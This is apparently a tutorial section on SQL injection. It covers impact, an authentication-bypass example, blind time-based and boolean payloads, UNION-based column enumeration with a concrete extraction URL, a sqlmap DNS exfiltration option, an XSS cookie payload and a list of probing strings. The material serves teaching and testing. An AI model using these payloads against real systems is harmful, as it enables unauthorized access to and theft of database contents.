#### 2.1. SQL injection

SQL injection occurs when malicious user input breaks the original SQL statement to inject 
arbitrary SQL code and manipulate the DBMS. This typically happens when untrusted user-input 
is concatenated (at application layer) with the SQL queries to be executed on the database-server.

When exploited successful, it allows unauthorized retrieval of potentially sensitive data:

- national (GOV domain) databases got leaked in the past using this technique
- one of oldest attacks that still persists nowadays o_O
- users might get their credit-card data/national ID compromised 
- data can be stolen for monetary purposes (dump DB, corrupt DB, ask for money to provide original records)


#### 2.2. Risk and impact

From a business perspective:

- impact is typically – HIGH (can lead to RCE in some edge cases)
- data loss, data corruption (pray BTC for backups; may lead to denial of service)
- once data was tampered with you cannot rely on it anymore (integrity is compromised)
- companies will suffer massively when their assets are vanished 
- sometimes they even go bank-robbed
- can lead to reflected XSS via error message: `/edit.php?id=1'<script>alert(document.cookie)</script>`

#### 2.3. Example - intended functionality

Example of POST request for user authentication:

```json
{
   "username" : "peter",
   "password" : "Wj*Fn*7krIS_MGO"
}
```

The MySQL query looks like:

```sql
SELECT * FROM users WHERE username='peter' AND password=hash('Wj*Fn*7krIS_MGO');
```


#### 2.4. Example - SQL injection

Example of POST request for user authentication:

```json
{
   "username" : "admin' AND 1=1-- -",
   "password" : "123"
}
```

The MySQL query looks like:

```sql
SELECT * FROM users WHERE username='admin' AND 1=1-- -' AND password=hash('123');
```
!! This is classic authentication bypass !! :)

Note:

- the SQL meta-character `'` forces the closing of the original query
- continuation of valid but unintended SQL query `AND 1=1`
- followed by MySQL comment `-- -` that tells DBMS to ignore the rest of the original query


#### 2.5. SQL injection types


1. Classic - easy to exploit, uses the same DB communication channel:
  - error-based: attacker relies on DBMS errors to extract data
  - union-based: uses UNION SELECT to combine extraction of DB results

2. Blind – attacker monitors view states according to malicious input:
  - time based: 
    - `page.php?id=3' AND sleep(5)-- -` (will delay HTTP response with 5+ seconds)

  - boolean based - attacker tries different payloads until output changes:
    - `page.php?id=-3' OR 1=1-- -` (evaluated as `true`)
    - `page.php?id=3' AND 1=2-- -` (evaluated as `false`)

  - arithmetic:
    - `page.php?id=3` returns same as `page.php?id=4-1`
    - `+` should always be URL encoded `%2b` - otherwise it means `[SPACE]` in the HTML request

3. Out-of-channel (data cannot be leaked through the same HTTP/application channel - SSRF like):
   - read/write file
   - DNS channel `sqlmap ... --dns-domain opendns.online`
   - FTP/email


#### 2.6. SQL injection - `UNION` based exfiltration

In SQL injection attacks, `UNION SELECT` & `ORDER BY` statements can be used to find the column index that exfiltrates data.

a) `SELECT ... FROM ... ORDER BY 3` - find the correct number of columns
b) `SELECT ... FROM ... UNION SELECT 1,2,3` - look for one (or more) of the column numbers to show up on the page

Note: if no. `2` appears in the response, the second column can be used for retrieval of data.

Also, at first we don't know what the original SQL select statement is, but we can iterate by:
```
UNION SELECT 1
UNION SELECT 1,2  
UNION SELECT 1,2,3 ...
GROUP BY 1
GROUP BY 2
GROUP BY 3
```
Both techniques can be used in SQLi to determine the number of columns for a valid `UNION SELECT`.

Concrete example:
```
http://example.com/index.php?s=1&l1=-572 UNION SELECT 1,2,3,4,5,6,7,8,9,(CURRENT_USER()),11,12,13,14,15,16,
17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,
54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,
91,92,93,94,95-- -
```
In this example, column no. `10` (gets displayed in the HTTP response) was used to exfiltrate the 
database user of the web application.

#### 2.7. Basic detection payloads

```
/?p=1
/?p=1'
/?p=1"
/?p=[1]
/?p[]=1
/?p=1`
/?p=1\
/?p=1/*'*/
/?p=1/*!666'*/
/?p=1'||'aaaa'||'
/?p=1' or '1'='1
/?p=1 or 1=1
/?p='or''='
```
